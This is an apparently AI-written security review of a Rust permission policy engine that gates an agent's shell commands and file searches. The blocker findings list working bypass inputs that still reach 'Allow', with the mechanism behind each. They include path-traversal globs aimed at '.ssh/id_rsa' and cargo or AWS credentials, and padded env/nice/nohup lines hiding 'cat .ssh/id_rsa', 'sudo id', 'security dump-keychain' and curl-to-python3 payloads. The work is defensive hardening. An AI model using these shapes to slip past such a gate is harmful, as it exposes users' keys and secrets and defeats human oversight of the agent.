# Review: M1-18-policy-followup, fix round 2 (commit 4b794cf, D-105)


Saved by the orchestrator from the reviewer's final message (log `.orchestration/logs/M1-18-policy-followup.jsonl`). Under D-105 this was the last round: the branch goes to the driver for a merge decision.
Reviewer: Gemini 4 Argon (High), read-only (D-101, D-105). Authors: Claude Opus 5.5 (round 1), Gemini 4 Hydrogen (fix rounds 1 and 2), the orchestrator (test rows).

## Verdict: `rework` (for the driver's D-105 merge decision: zero `Allow` regressions vs `dev`, zero false hard denies on ordinary lines; remaining `same as dev` gaps documented with known-limit wordings below)

Fix round 2 ([4b794cf](crates/atrium-core/src/policy/shell.rs)) closes:
- all 19 named lines from Round-2 Blocker 1 (**K1**), and the general invariant for unknown `env`/`command` invocations up to `MAX_UNKNOWN_STARTS = 24` words across any combination of short, long, `=`, and `-ZS…`/`-ZC…` clustered options;
- all 19 named lines from Round-2 Blocker 2 (**P1 / D-100**), including `$HOME`/`${HOME}`/`$PWD`/`${PWD}`/`$VAR` anchors, widened character classes (`[.][.]`, `.[.]`, `[!a][!a]`, `??`) and `\`, and canonical/home-anchored `search_glob_hit` under `~` for `recursive: true` and `false`;
- all 11 named lines from Round-2 Blocker 3 (**CR-12**), including `./`, `//`, and `literal/..` normalization in `ask_search_glob_hit` and arbitrary/fail-closed Git `:…` pathspec magic in `git_names_credential`;
- Round-2 **Major 4** (**D-100** rule precedence in `allow_covers` / `apply_rules`: higher-scope `PathGlob` and `path_scope`-restricted `Any` `Allow` rules no longer set `covered` on an escaping glob or mask lower-scope `Deny` rules);
- Round-2 **Minor 5** (`split_words` now uses the shared `LexCache` and respects `MAX_DEPTH`, keeping nested `env -S` linear at `< 5ms`).

There are **zero `Allow` regressions against `dev`** and **zero false hard denies on ordinary lines**. However, per the rule that any input still reaching `Allow` on a sensitive or credential-store path is a blocker, two families of **`same as dev`** `Allow` bypasses remain in **P1 / CR-12** and **K1** when inputs step outside the new fail-closed bounds or normalization assumptions.

---

## Findings

> Inputs reaching `Allow` on a sensitive or credential-store path are listed first, marked `blocker`, with their `regression vs dev` or `same as dev` comparison and a one-line suggested known-limit wording for D-105.

### Blockers

#### 1. [blocker] P1 & CR-12: Wildcard components before `..` (`*/../.ssh/id_rsa`, `[a-z]/../.cargo/credentials.toml`), combined dot-class + slash-class globs (`[.][.][/].ssh/id_rsa`), and overflowing brace sets with a non-first escaping branch (`{a,../.ssh}/id_rsa{1..20}{1..20}`) still reach `Allow` — **`same as dev`**
- **Locations:**
  - [deny.rs:1437-1463](crates/atrium-core/src/policy/deny.rs#L1437-L1463) (`normalize_glob_str`) vs [deny.rs:1813-1844](crates/atrium-core/src/policy/deny.rs#L1813-L1844) (`check_escape_variant`)
  - [deny.rs:1697-1704](crates/atrium-core/src/policy/deny.rs#L1697-L1704) and [deny.rs:1772-1780](crates/atrium-core/src/policy/deny.rs#L1772-L1780) (`widen_pattern_dots` / `widen_pattern_slashes`)
  - [deny.rs:1611-1647](crates/atrium-core/src/policy/deny.rs#L1611-L1647) (`brace_fallback`)
  - [deny.rs:597-609](crates/atrium-core/src/policy/deny.rs#L597-L609) (`ask_probes`)
- **Mechanism:**
  1. **Wildcard component before `..` (`*/..`, `p*/..`, `[a-z]/..`) inside `~`, `~/.aws`, or `~/.cargo`:** In `normalize_glob_str` ([deny.rs:1444-1451](crates/atrium-core/src/policy/deny.rs#L1444-L1451)), `".."` only pops the preceding segment when `!p.contains(['*', '?', '['])`. Thus `*/../.ssh/id_rsa` and `[a-z]/../.cargo/credentials.toml` remain uncollapsed in `search_glob_hit` and `ask_search_glob_hit`, which fail to match `.ssh/id_rsa` or `.cargo/credentials.toml`. Meanwhile, in `check_escape_variant` ([deny.rs:1828](crates/atrium-core/src/policy/deny.rs#L1828)), `words::normalize` *does* pop `"*"` / `"[a-z]"` before `".."`, resolving `/h/u/*/../.ssh/id_rsa` to `/h/u/.ssh/id_rsa`. Because `/h/u/.ssh/id_rsa` is inside `roots = ["/h/u"]` (`inside == true`), `glob_escape` leaves `out.patterns` empty and `out.unknown = false`. Consequently, `recursive: false` searches reach `Allow` across **Home, `Any`, and `FullAccess`**, and `recursive: true` searches reach `Allow` under **`Any` and `FullAccess`**.
  2. **Combined dot-matching (`[.]` / `?`) and slash-matching (`[/]`) classes:** `glob_search_variants` ([deny.rs:1697-1704](crates/atrium-core/src/policy/deny.rs#L1697-L1704)) and `glob_escape` ([deny.rs:1772-1780](crates/atrium-core/src/policy/deny.rs#L1772-L1780)) call `widen_pattern_slashes` only on `&expanded`, not on `&dots`. When a glob combines both (`[.][.][/].ssh/id_rsa`, `??[/].ssh/id_rsa`, `proj[/][.][.][/].ssh/id_rsa`), `dots` is `..[/].ssh/id_rsa` and `sl` is `[.][.]/.ssh/id_rsa`; neither has a `/`‑separated `..` component, so `out.patterns` is empty and D-100 allows it under `Any` and `FullAccess` (`Ask` in Home).
  3. **Overflowing brace sets (`> 256` results) where the escaping branch is not the first comma alternative:** `brace_fallback` ([deny.rs:1632-1635](crates/atrium-core/src/policy/deny.rs#L1632-L1635)) only samples the first alternative (`mode == 0`) and empty (`mode == 1`). On `{a,../.ssh}/id_rsa{1..20}{1..20}` or `{a,/h/u/.ssh/id_rsa}{1..20}{1..20}`, `brace_fallback` produces `"a/id_rsa1..201..20"` and `"/id_rsa"`, missing `/h/u/.ssh/id_rsa` and returning `Allow` under `Any` and `FullAccess` (`Ask` in Home).
  4. **`ASK_TREES` probe extension in `ask_probes` ([deny.rs:600-603](crates/atrium-core/src/policy/deny.rs#L600-L603)):** `ask_probes` only probes `{tree}` and `{tree}/x.json` for `ASK_TREES`, so extension-filtered non-recursive searches of `.zsh_sessions` or `.bash_sessions` (e.g., `.zsh_sessions/*.session`) do not match `x.json` and return `Allow` in Home.
- **Evidence** (`[Home, Any, FullAccess]`):
  - `ToolSubject::Paths { paths: ["~"], glob: Some("*/../.ssh/id_rsa"), recursive: false }` -> `["Allow", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`, **`same as dev`**)
  - `ToolSubject::Paths { paths: ["~"], glob: Some("*/../.ssh/id_rsa"), recursive: true }` -> `["Ask", "Allow", "Allow"]` (`dev`: `["Ask", "Allow", "Allow"]`, **`same as dev`**)
  - `ToolSubject::Paths { paths: ["~"], glob: Some("p*/../.ssh/id_rsa"), recursive: false }` -> `["Allow", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`, **`same as dev`**)
  - `ToolSubject::Paths { paths: ["~"], glob: Some("[a-z]/../.ssh/id_rsa"), recursive: false }` -> `["Allow", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`, **`same as dev`**)
  - `ToolSubject::Paths { paths: ["~"], glob: Some("[a-z]/../.ssh/id_rsa"), recursive: true }` -> `["Ask", "Allow", "Allow"]` (`dev`: `["Ask", "Allow", "Allow"]`, **`same as dev`**)
  - `ToolSubject::Paths { paths: ["~"], glob: Some("?/../.ssh/id_rsa"), recursive: false }` -> `["Ask", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`, **`same as dev` on Any/FullAccess, stricter in Home**)
  - `ToolSubject::Paths { paths: ["~/.aws"], glob: Some("*/../credentials"), recursive: false }` -> `["Allow", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`, **`same as dev`**)
  - `ToolSubject::Paths { paths: ["~/.aws"], glob: Some("*/../credentials"), recursive: true }` -> `["Ask", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`, **`same as dev` on Any/FullAccess, stricter in Home**)
  - `ToolSubject::Paths { paths: ["~"], glob: Some("*/../.cargo/credentials.toml"), recursive: false }` -> `["Allow", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`, **`same as dev`**)
  - `ToolSubject::Paths { paths: ["~"], glob: Some("[a-z]/../.pypirc"), recursive: false }` -> `["Allow", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`, **`same as dev`**)
  - `ToolSubject::Paths { paths: ["~/.cargo"], glob: Some("*/../credentials.toml"), recursive: false }` -> `["Allow", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`, **`same as dev`**)
  - `ToolSubject::Paths { paths: ["~/.aws"], glob: Some("*/../sso/cache/*"), recursive: false }` -> `["Allow", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`, **`same as dev`**)
  - `ToolSubject::Paths { paths: ["~"], glob: Some(".zsh_sessions/*.session"), recursive: false }` -> `["Allow", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`, **`same as dev`**)
  - `ToolSubject::Paths { paths: ["~/proj"], glob: Some("[.][.][/].ssh/id_rsa"), recursive: true }` -> `["Ask", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`, **`same as dev` on Any/FullAccess, stricter in Home**)
  - `ToolSubject::Paths { paths: ["~/proj"], glob: Some("??[/].ssh/id_rsa"), recursive: true }` -> `["Ask", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`, **`same as dev` on Any/FullAccess, stricter in Home**)
  - `ToolSubject::Paths { paths: ["~"], glob: Some("proj[/][.][.][/].ssh/id_rsa"), recursive: false }` -> `["Ask", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`, **`same as dev` on Any/FullAccess, stricter in Home**)
  - `ToolSubject::Paths { paths: ["~/proj"], glob: Some("{a,../.ssh}/id_rsa{1..20}{1..20}"), recursive: true }` -> `["Ask", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`, **`same as dev` on Any/FullAccess, stricter in Home**)
  - `ToolSubject::Paths { paths: ["~/proj"], glob: Some("{a,/h/u/.ssh/id_rsa}{1..20}{1..20}"), recursive: true }` -> `["Ask", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`, **`same as dev` on Any/FullAccess, stricter in Home**)
- **Suggested known-limit wording (1 line):**
  > Search globs that pair a non-`**` wildcard segment with `..` inside a root (`*/../.ssh/id_rsa`), combine dot-matching and slash-matching classes (`[.][.][/]…`), or exceed 256 brace expansions before a sensitive alternative are not caught by the static glob normalizer.

---

#### 2. [blocker] K1: Unbounded unknown `env`/`command` invocations (`> 24` words) with multi-word `-S`/`--split-string` arguments, `security`/`secret-tool`, or non-shell interpreters (`python3`/`node`), and non-`env`/`command` wrappers (`nice`/`nohup`) with `>= 5` mixed unknown options reach `Allow` under `Any` and `FullAccess` — **`same as dev`**
- **Locations:**
  - [deny.rs:49-138](crates/atrium-core/src/policy/deny.rs#L49-L138) (`unknown_tok_dangerous`, `unknown_words_could_be_dangerous`)
  - [shell.rs:2121-2169](crates/atrium-core/src/policy/shell.rs#L2121-L2169) (`unwrap_readings_bounded`), [shell.rs:2356](crates/atrium-core/src/policy/shell.rs#L2356) (`orig_a`), [shell.rs:3436](crates/atrium-core/src/policy/shell.rs#L3436) (`expand_unknown_env_cmd`)
- **Mechanism:**
  1. When an unknown `env` or `command` invocation exceeds `MAX_UNKNOWN_STARTS = 24` words (e.g., an unknown flag `-A0` with no argument followed by `-A1 v1 … -A12 v12`, so neither `mask = 0..16` nor `mask = u32::MAX` reaches the command), `expand_unknown_env_cmd` sets `unbounded = true` and delegates to `unknown_words_could_be_dangerous` ([deny.rs:104-138](crates/atrium-core/src/policy/deny.rs#L104-L138)).
  2. In `unknown_words_could_be_dangerous`, `split_whitespace()` is called on `=` values (`--split-string=...`) and attached `-C`/`-S` short-flag suffixes (`-S...`), but **not** on a separate argument word `w` after `-S` or `--split-string` ([deny.rs:112](crates/atrium-core/src/policy/deny.rs#L112)). Thus `-S 'cat .ssh/id_rsa'` (in `~`) or `-S 'sudo id'` passes `"cat .ssh/id_rsa"` or `"sudo id"` as a single token to `unknown_tok_dangerous`, which resolves `/h/u/cat .ssh/id_rsa` (inside `cwd`, not matching `.ssh/id_rsa`) and checks `base("sudo id") == "sudo id"` (not `"sudo"`), returning `false`.
  3. `unknown_tok_dangerous` ([deny.rs:71-101](crates/atrium-core/src/policy/deny.rs#L71-L101)) also omits `security` (`dump-keychain`, `find-generic-password`), `secret-tool`, and non-shell interpreters (`python*`, `node`, `perl`, `ruby`, `deno`, `bun`, `php`, `lua`, `pwsh`) when piped from `curl`.
  4. `orig_a` ([shell.rs:2356](crates/atrium-core/src/policy/shell.rs#L2356)) only records `unknown_invs` for `env` and `command`; other wrappers (`nice`, `nohup`, `time`, `xargs`, `stdbuf`, `setsid`) with `>= 5` unknown options mixing 1-word and 2-word flags still stop after 4 choice bits (`mask = 0..16` plus `u32::MAX`).
- **Evidence** (`[home, prefix, any, full]`):
  - `env -A0 -A1 v1 -A2 v2 -A3 v3 -A4 v4 -A5 v5 -A6 v6 -A7 v7 -A8 v8 -A9 v9 -A10 v10 -A11 v11 -A12 v12 -S 'cat .ssh/id_rsa'` -> `["Ask", "Ask", "Allow", "Allow"]` (`dev`: `["Ask", "Ask", "Allow", "Allow"]`, **`same as dev`**)
  - `env -A0 -A1 v1 -A2 v2 -A3 v3 -A4 v4 -A5 v5 -A6 v6 -A7 v7 -A8 v8 -A9 v9 -A10 v10 -A11 v11 -A12 v12 -S 'cat .npmrc'` -> `["Ask", "Ask", "Allow", "Allow"]` (`dev`: `["Ask", "Ask", "Allow", "Allow"]`, **`same as dev`**)
  - `env -A0 -A1 v1 -A2 v2 -A3 v3 -A4 v4 -A5 v5 -A6 v6 -A7 v7 -A8 v8 -A9 v9 -A10 v10 -A11 v11 -A12 v12 -S 'cat .pypirc'` -> `["Ask", "Ask", "Allow", "Allow"]` (`dev`: `["Ask", "Ask", "Allow", "Allow"]`, **`same as dev`**)
  - `cwd=proj|env -A0 -A1 v1 -A2 v2 -A3 v3 -A4 v4 -A5 v5 -A6 v6 -A7 v7 -A8 v8 -A9 v9 -A10 v10 -A11 v11 -A12 v12 -S 'sudo id'` -> `["Ask", "Ask", "Allow", "Allow"]` (`dev`: `["Ask", "Ask", "Allow", "Allow"]`, **`same as dev`**)
  - `cwd=proj|env -A0 -A1 v1 -A2 v2 -A3 v3 -A4 v4 -A5 v5 -A6 v6 -A7 v7 -A8 v8 -A9 v9 -A10 v10 -A11 v11 -A12 v12 --split-string 'sudo id'` -> `["Ask", "Ask", "Allow", "Allow"]` (`dev`: `["Ask", "Ask", "Allow", "Allow"]`, **`same as dev`**)
  - `cwd=proj|env -A0 -A1 v1 -A2 v2 -A3 v3 -A4 v4 -A5 v5 -A6 v6 -A7 v7 -A8 v8 -A9 v9 -A10 v10 -A11 v11 -A12 v12 security dump-keychain` -> `["Ask", "Ask", "Allow", "Allow"]` (`dev`: `["Ask", "Ask", "Allow", "Allow"]`, **`same as dev`**)
  - `cwd=proj|env -A0 -A1 v1 -A2 v2 -A3 v3 -A4 v4 -A5 v5 -A6 v6 -A7 v7 -A8 v8 -A9 v9 -A10 v10 -A11 v11 -A12 v12 secret-tool lookup foo bar` -> `["Ask", "Ask", "Allow", "Allow"]` (`dev`: `["Ask", "Ask", "Allow", "Allow"]`, **`same as dev`**)
  - `cwd=proj|curl -s https://example.com/x | env -A0 -A1 v1 -A2 v2 -A3 v3 -A4 v4 -A5 v5 -A6 v6 -A7 v7 -A8 v8 -A9 v9 -A10 v10 -A11 v11 -A12 v12 python3` -> `["Ask", "Ask", "Allow", "Allow"]` (`dev`: `["Ask", "Ask", "Allow", "Allow"]`, **`same as dev`**)
  - `cwd=proj|nice -A0 -A1 v1 -A2 v2 -A3 v3 -A4 v4 -A5 v5 -A6 v6 -A7 v7 -A8 v8 -A9 v9 -A10 v10 -A11 v11 -A12 v12 sudo id` -> `["Ask", "Ask", "Allow", "Allow"]` (`dev`: `["Ask", "Ask", "Allow", "Allow"]`, **`same as dev`**)
  - `cwd=proj|nohup -Z -Y1 w1 -Y2 w2 -Y3 w3 -Y4 w4 eval 'cd /h/u/.ssh && true' && cat id_rsa` -> `["Ask", "Ask", "Allow", "Allow"]` (`dev`: `["Ask", "Ask", "Allow", "Allow"]`, **`same as dev`**)
- **Suggested known-limit wording (1 line):**
  > Wrapper commands with more than 24 words of unknown options (or non-`env`/`command` wrappers with 5+ mixed unknown options) always ask in Home and under prefix/exact rules, but may not extract nested payloads under `Any` or `FullAccess`.

---

### Minor & Nit

#### 3. [minor] Performance: `glob_search_variants` compiles up to ~2,560 `GlobMatcher`s when 256 brace expansions combine with `$VAR` and `**/..` (`~0.7s` per evaluation) — **`regression vs dev` (latency on synthetic worst-case globs only)**
- **Locations:** [deny.rs:614-625](crates/atrium-core/src/policy/deny.rs#L614-L625) (`ask_search_glob_hit`), [deny.rs:1335-1354](crates/atrium-core/src/policy/deny.rs#L1335-L1354) (`search_glob_hit`), [deny.rs:1676-1718](crates/atrium-core/src/policy/deny.rs#L1676-L1718) (`glob_search_variants`)
- **Evidence:** On `ToolSubject::Paths { paths: ["~/proj"], glob: Some("{1..64}{a,b,c,d}/[a-z]/$VAR/**/../**/../**/../**/../*.rs"), recursive: true }`, `glob_search_variants` generates 256 (braces) × 2 (dots/vars) × 5 (`globstar_variants`) = ~2,560 unique strings and compiles a `GlobMatcher` for each one in both `search_glob_hit` and `ask_search_glob_hit`, taking `2.14s` across 3 `evaluate` calls (`~710ms` per call). Normal and adversarial test suites are unaffected (`adversarial_fuzz`: `13.73s`–`13.76s`; `policy`: `3.76s`–`3.78s`; 100 unknown `env` options: `26.9ms`; 6-deep nested `env -S`: `< 5ms`; 7-deep alternating `env -Z nohup`: `186ms`).
- **Suggested known-limit wording (1 line):**
  > Search globs that combine hundreds of brace expansions with `$VAR` and repeated `**/..` segments can take ~0.7s to compile and check.

#### 4. [nit] Fail-closed cost on two uncommon ordinary shapes in Home: `git log -L :<func>:<file>` and character-range globs spanning `/` (`[,-0]`) return `Ask` instead of `Allow` in Home — **`regression vs dev` (Ask in Home only, never a HardDeny)**
- **Locations:** [engine.rs:639-642](crates/atrium-core/src/policy/engine.rs#L639-L642) (`git_names_credential`), [deny.rs:1543-1548](crates/atrium-core/src/policy/deny.rs#L1543-L1548) (`widen_pattern_slashes`)
- **Evidence:**
  - `cwd=proj|git log -L :main:src/lib.rs` -> `["Ask", "Ask", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow", "Allow"]`), because `:main:src/lib.rs` starts with `:` and is not `:N:path`, leaving `s = "main:src/lib.rs"` which triggers `s.contains(':')` (`git log -L 1,20:src/lib.rs` still returns `["Allow", "Allow", "Allow", "Allow"]`).
  - `ToolSubject::Paths { paths: ["~/proj"], glob: Some("[,-0]*.rs"), recursive: true }` -> `["Ask", "Allow", "Allow"]` (`dev`: `["Allow", "Allow", "Allow"]`), because `w[0] <= b'/' && b'/' <= w[2]` in `widen_pattern_slashes` triggers on any ASCII range bridging `'/'` (0x2F).
- **Suggested known-limit wording (1 line):**
  > `git log -L :<func>:<file>` function-range arguments and search globs with ASCII character ranges spanning `/` (`[,-0]`) ask for confirmation in Home.

---

## Check-by-Check Summary (Items 1–5)

1. **Round-2 Blockers 1–3, Major 4, and Minor 5:**
   - **Blocker 1 (K1):** Closed for all 19 evidence lines and for any mix of unknown short/long/clustered options in `env` and `command` up to 24 words. Remaining edge cases past 24 words or on non-`env`/`command` wrappers with 5+ mixed unknown options: Finding 2.
   - **Blocker 2 (P1):** Closed for all 19 evidence lines (`$HOME`, `${HOME}`, `$PWD`, `$VAR`, `[.][.]`, `.[.]`, `??`, `[!a][!a]`, `\`, and `search_glob_hit` from `~` with `recursive: true` and `false`). Remaining edge cases: Finding 1 (`*/..` inside a root, combined `[.][.][/]`, and `> 256` brace overflow with non-first escaping alternative).
   - **Blocker 3 (CR-12):** Closed for all 11 evidence lines (`.cargo/./credentials.toml`, `.cargo//credentials.toml`, `proj/../.cargo/credentials.toml`, `~/./.cargo/credentials.toml`, and `::`, `:/:`, `:!:`, `:^:`, `:!(top)`, `:/:(icase)`, `:(unclosed`, `:~` git pathspecs). Remaining edge cases: `*/..` in Finding 1.
   - **Major 4 (D-100 rule precedence):** Closed cleanly in [engine.rs:129-132](crates/atrium-core/src/policy/engine.rs#L129-L132) and [engine.rs:868-869](crates/atrium-core/src/policy/engine.rs#L868-L869). Only an unscoped `RuleMatcher::Any` rule covers `glob_leaves == true`; `Deny` rules take precedence across scopes; `hard_deny` still wins first.
   - **Minor 5 (`split_words` `LexCache` & `MAX_DEPTH`):** Closed cleanly in [shell.rs:2521-2540](crates/atrium-core/src/policy/shell.rs#L2521-L2540).
2. **Fail-closed cost on ordinary lines:**
   - Tested everyday `env`/`command` lines (`env FOO=1 BAR=2 cargo test`, `env -i ... make`, `env -u ...`, `env -C sub cargo build`, `env --chdir=sub make`, `env -S 'cargo test --lib'`, `command -v rg`, `command -V git`, `command -p ls`, `command ls -la`, `command git status`), git pathspecs (`':!vendor'`, `':(exclude)target'`, `':/README.md'`, `':^Cargo.lock'`, `':(top,exclude)dist'`, `'::src/main.rs'`, `HEAD:src/main.rs`, `:0:src/lib.rs`, `-L 1,20:src/lib.rs`, `':(glob)crates/**/*.rs'`), `rg`/`grep`/`find`/`fd` globs (`'*.{rs,toml}'`, `'[A-Z]*.md'`, `'?.txt'`, `'!target/**'`), `Search` subjects in `~/proj` and `~` (`*.{rs,toml}`, `[A-Z]*.md`, `?.txt`, `[!.]*.rs`, `[!a]*.rs`, `proj/**/*.rs`, `proj/*.{rs,toml}`, `proj/[A-Z]*.md`, `proj/?.txt`), and `cd X && ...` chains: **zero false hard denies**, and only the two minor `Ask` cases in Finding 4.
3. **Performance:**
   - `cargo test -p atrium-core --test adversarial_fuzz`: **`13.76s`** (`13.73s` in full suite run; 2 passed, 1 ignored).
   - `cargo test -p atrium-core --test policy`: **`3.78s`** (`3.76s` in full suite run; 44 passed).

---

## Commands Run

- `cargo clippy -p atrium-core --all-targets -- -D warnings` -> exit `0` (`1.27s`, 0 warnings).
- `cargo test -p atrium-core --test adversarial_fuzz` -> exit `0` (`2 passed; 0 failed; 1 ignored; finished in 13.76s`).
- `cargo test -p atrium-core --test policy` -> exit `0` (`44 passed; 0 failed; 0 ignored; finished in 3.78s`).
- `cargo test -p atrium-core --no-fail-fast` -> exit `0` (all test binaries passed):
  - `src/lib.rs`: `9 passed; 0 failed; 0 ignored` (`0.00s`)
  - `adversarial_fuzz`: `2 passed; 0 failed; 1 ignored` (`13.73s`)
  - `adversarial_gate`: `9 passed; 0 failed; 2 ignored` (`0.12s`)
  - `adversarial_ledger`: `14 passed; 0 failed; 0 ignored` (`0.18s`)
  - `adversarial_m1_18`: `24 passed; 0 failed; 0 ignored` (`1.92s`)
  - `adversarial_ordinary`: `16 passed; 0 failed; 0 ignored` (`0.11s`)
  - `adversarial_policy`: `16 passed; 0 failed; 3 ignored` (`0.09s`)
  - `adversarial_regression`: `57 passed; 0 failed; 0 ignored` (`1.68s`)
  - `attention`: `8 passed; 0 failed; 0 ignored` (`0.00s`)
  - `history`: `25 passed; 0 failed; 0 ignored` (`1.41s`)
  - `ledger`: `20 passed; 0 failed; 0 ignored` (`0.02s`)
  - `policy`: `44 passed; 0 failed; 0 ignored` (`3.76s`)
  - `store`: `30 passed; 0 failed; 0 ignored` (`36.36s`)
- Temporary probe test `crates/atrium-core/tests/probe_review_round3.rs` run and deleted; `git status --short` is clean (empty).

